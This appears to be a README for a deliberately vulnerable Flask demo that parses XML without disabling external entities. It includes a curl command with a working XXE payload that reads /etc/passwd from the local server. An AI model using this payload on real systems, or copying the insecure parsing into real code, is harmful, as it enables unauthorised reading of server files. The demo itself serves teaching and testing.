# XXE Vulnerable Web Application 
This project demonstrates a simple Python web application using Flask that is vulnerable to XML External Entity (XXE) attacks.  
The application accepts XML input and parses it without disabling external entity references, making it vulnerable to XXE attacks.  
## Why It Is Vulnerable 
The vulnerability exists because the application parses user-supplied XML without disabling external entities.  
This allows an attacker to craft an XML payload that includes an external entity reference, which can be used to read arbitrary files on the server or perform other malicious actions.  
## Steps to Launch the App and Test the Vulnerability 
 
1. **Set Up a Virtual Environment:**


```sh
python -m venv venv
source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
```
 
1. **Install Dependencies:**


```sh
pip install Flask lxml
```
 
1. **Run the Application:**


```sh
python app.py
```
 
1. **Access the Application:** 
Open your web browser and navigate to `http://127.0.0.1:5000`.
 
2. **Test the Vulnerability:**
 
- Use a tool like `curl` or an API testing tool to send the following XML payload to the application:


```xml
curl -X POST http://127.0.0.1:5000/parse-xml \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
```
 
- The response should include the contents of the `/etc/passwd` file, demonstrating the XXE vulnerability.

## Explanation 
In `app.py`, the user input is parsed using the `lxml.etree.fromstring` function without disabling external entities.
This allows an attacker to include an external entity reference in the XML input, which can be used to read arbitrary files from the server.  
This PoC illustrates the dangers of XXE attacks and underscores the importance of proper XML parsing configurations to prevent such vulnerabilities.  
